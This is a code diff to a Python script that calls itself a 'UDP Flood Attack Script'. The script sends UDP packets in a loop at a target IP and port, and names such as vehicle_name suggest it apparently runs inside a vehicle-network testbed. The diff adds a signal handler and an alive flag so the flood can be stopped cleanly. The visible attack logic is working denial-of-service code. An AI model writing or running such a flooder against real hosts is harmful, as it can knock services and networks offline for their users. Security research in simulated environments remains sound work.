@@ -4,6 +4,7 @@ import time
 import argparse
 import logging
 import os
+import signal
 
 class Attack:
     def __init__(self, target_ip, target_port=80, duration=60, packet_size=1024, delay=0.001):
@@ -22,13 +23,14 @@ class Attack:
         self.duration = duration
         self.packet_size = packet_size
         self.delay = delay
+        
 
 
     def attack_condition(self):
         if self.duration == 0:
-            return True
+            return self.alive
         else:
-            return time.time() < self.end_time
+            return self.alive and (time.time() < self.end_time)
 
 
     def start_attack(self):
@@ -55,7 +57,7 @@ class Attack:
         logger.debug(f"Packet size: {self.packet_size} bytes")
 
         try:
-            
+            self.alive = True
             while self.attack_condition():
                 sock.sendto(data, (self.target_ip, self.target_port))
                 packets_sent += 1
@@ -92,8 +94,14 @@ class Attack:
             logger.debug(f"Throughput: {mbps:.2f} Mbps")
 
 
+def interrupt_signal_handler(sig, frame):
+    global attack
+    logger.debug(f"Received signal {sig}. Gracefully stopping {vehicle_name} attacker.")
+    attack.alive = False
+
+
 def main():
-    global logger
+    global logger, attack, vehicle_name
     parser = argparse.ArgumentParser(description="UDP Flood Attack Script")
     parser.add_argument('--logging_level', type=str, default='INFO', help='Logging level')
     parser.add_argument("--target_ip", help="Target IP address")
@@ -108,6 +116,7 @@ def main():
     logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=str(args.logging_level).upper())
     logger = logging.getLogger(vehicle_name+'_'+'attacker')
     args.logger = logger
+    signal.signal(signal.SIGINT, lambda sig, frame: interrupt_signal_handler(sig, frame))
     logger.info(f"Starting attack from vehicle: {vehicle_name}")
 
     attack = Attack(
